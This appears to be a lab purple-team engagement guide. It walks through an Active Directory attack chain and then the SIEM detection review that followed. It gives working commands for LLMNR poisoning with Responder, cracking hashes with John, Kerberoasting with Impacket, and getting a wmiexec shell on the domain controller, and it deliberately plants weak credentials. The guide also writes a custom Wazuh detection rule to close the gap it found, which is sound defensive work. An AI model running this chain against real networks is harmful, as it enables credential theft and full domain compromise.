# Hunt Engagement Guide

## Purpose

This records the attack chain for this engagement: initial access, privilege
escalation, domain compromise, and what Sentinel detected at each step. It's
written from the completed engagement so it can be reviewed or reproduced
without relying on chat history.

## Setup

Two things were prepared before the attack chain ran, both recorded here
rather than presented as if they were simply discovered:

`james.whitmore`'s password was reset to `Password1` on DC01, representing
the "one weak password among sixteen users" finding that's realistic in any
company of this size:

```powershell
Set-ADAccountPassword -Identity james.whitmore -Reset -NewPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force)
Set-ADUser -Identity james.whitmore -ChangePasswordAtLogon $false
```

The planted escalation path from [ADR-002](../engineering-decisions/002-planted-misconfiguration.md)
was created: a Kerberoastable service account, `svc-appsvc`, in the IT OU,
with an SPN registered and a weak password, added to Domain Admins.

```powershell
New-ADUser -Name "SVC AppSvc" `
    -SamAccountName svc-appsvc `
    -UserPrincipalName svc-appsvc@apexdynamics.internal `
    -Path "OU=IT,OU=Users,OU=Apex,DC=apexdynamics,DC=internal" `
    -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true

setspn -A HTTP/app01.apexdynamics.internal svc-appsvc
Add-ADGroupMember -Identity "Domain Admins" -Members svc-appsvc
```

## Initial access: LLMNR/NBT-NS poisoning

Responder was run on KALI01, listening on the corpnet interface:

```bash
sudo responder -I eth0 -wv
```

WS01 (logged in as `james.whitmore`) attempted to access a nonexistent UNC
path, which is the lab's stand-in for the organic broadcast noise a real
network generates constantly on its own (WPAD auto-discovery, typos, stale
share references):

```powershell
dir \\fileserver01\shared
```

DNS had nothing for `fileserver01`, so WS01 fell back to an LLMNR/NBT-NS
broadcast, which Responder answered before anything else could. WS01
authenticated to the impostor, and Responder captured the NTLMv2
challenge-response:

```text
[SMB] NTLMv2-SSP Username : APEX\james.whitmore
[SMB] NTLMv2-SSP Hash     : james.whitmore::APEX:5d0ba2823fb1dc61:...
```

## Cracking the captured hash

The captured hash was saved and run against `hashcat` first, which failed
with no OpenCL/CUDA/HIP backend available, since this VM has no GPU
passthrough:

```text
clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR
```

Installing a CPU OpenCL runtime (`pocl-opencl-icd`) wasn't available under
that package name in the current Kali repos, and `intel-opencl-icd` (already
present) targets real Intel GPU hardware, not a VM with none. Rather than
keep chasing an OpenCL backend, John the Ripper was used instead, which runs
natively on CPU with no GPU dependency:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/jw_hash.txt
```

Cracked instantly: `Password1` for `james.whitmore`, confirming a valid,
completely ordinary low-privilege domain credential, obtained without
touching any planted vulnerability.

## Privilege escalation: Kerberoasting

With that credential, SPNs were enumerated and a service ticket requested
for every account found, using Impacket:

```bash
impacket-GetUserSPNs -dc-ip 10.10.10.10 apexdynamics.internal/james.whitmore:Password1 -request
```

This immediately surfaced `svc-appsvc`, already showing its Domain Admins
membership in the tool's own output, and returned a crackable
`$krb5tgs$23$...` ticket. Cracked the same way as before, with John:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt /tmp/svc_hash.txt
```

Cracked instantly: `Password123` for `svc-appsvc`.

## Confirming domain compromise

The recovered credential was validated and then used to get an actual shell
on DC01, not just a confirmed login:

```bash
nxc smb 10.10.10.10 -u svc-appsvc -p Password123
```
Returned `Pwn3d!`, confirming local admin rights on DC01.

```bash
impacket-wmiexec apexdynamics.internal/svc-appsvc:Password123@10.10.10.10
```

Inside the resulting shell:

```text
C:\>whoami
apex\svc-appsvc

C:\>hostname
DC01
```

Full domain compromise confirmed: arbitrary command execution on the domain
controller itself, reached from a starting position of zero credentials and
one deliberately planted (but realistic) misconfiguration.

## Detection review against Sentinel

Every step above was checked against the Wazuh dashboard on MON01
(`agent.name:DC01`, filtered by event type and time window).

| Attack step | Detected? | Evidence |
|---|---|---|
| LLMNR/NBT-NS poisoning, hash capture | No | No host-agent artifact exists for this network-layer technique; would need network-level monitoring (Zeek/Suricata), out of scope for Sentinel as built |
| Kerberoasting (ticket request) | Not by default | Event ID 4769 is collected, but only matched a generic "Windows Logon Success" rule (level 3, rule 60106); no rule recognized the RC4 encryption type that marks a Kerberoasting attempt |
| Domain Admins group membership change | Yes | "Domain Admins Group Changed", rule 60159, level 12 |
| Domain compromise (auth and shell as `svc-appsvc`) | Yes | "Successful Remote Logon Detected... possible pass-the-hash attack", rule 92652, level 6, paired with "Special privileges assigned to new logon", rule 67028 |

The pattern makes sense: the loud, obviously administrative steps
(privileged group changes, an admin-level logon) were caught by Wazuh's
default ruleset with no extra work. The quiet step, a Kerberos ticket
request that looks almost identical to normal Kerberos traffic unless you
check the encryption type specifically, slipped through.

## Closing the Kerberoasting detection gap

A custom Wazuh rule was written to catch what the default ruleset missed.
The exact field names were confirmed directly from a real 4769 event's
`data.win.eventdata` fields rather than assumed, since a rule referencing
the wrong field name fails silently:

```xml
<group name="windows,kerberos,attack,">
  <rule id="100010" level="10">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <field name="win.eventdata.serviceName" negate="yes">\$$</field>
    <description>Possible Kerberoasting: RC4-encrypted service ticket requested for $(win.eventdata.serviceName)</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
    <group>kerberoasting,attack,</group>
  </rule>
</group>
```

`0x17` (RC4) is the signature: Impacket's `GetUserSPNs` requests RC4-encrypted
tickets by default because they're far faster to crack offline than AES ones,
and legitimate Kerberos activity mostly uses AES today. The `serviceName`
exclusion filters out normal computer-account ticket requests (which end in
`$`), since Kerberoasting specifically targets user accounts serving as
service accounts, the only ones with realistically crackable passwords.

Deployed on MON01:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
sudo /var/ossec/bin/wazuh-control restart
```

Validated live by re-running the exact same Kerberoasting command and
confirming the new rule fired:

```text
rule.description: Possible Kerberoasting: RC4-encrypted service ticket
                   requested for svc-appsvc
rule.id:           100010
rule.level:        10
rule.mitre.id:      T1558.003
rule.mitre.tactic:  Credential Access
rule.mitre.technique: Kerberoasting
```

The detection gap identified during this engagement is now closed and
proven working, not just documented as a finding.
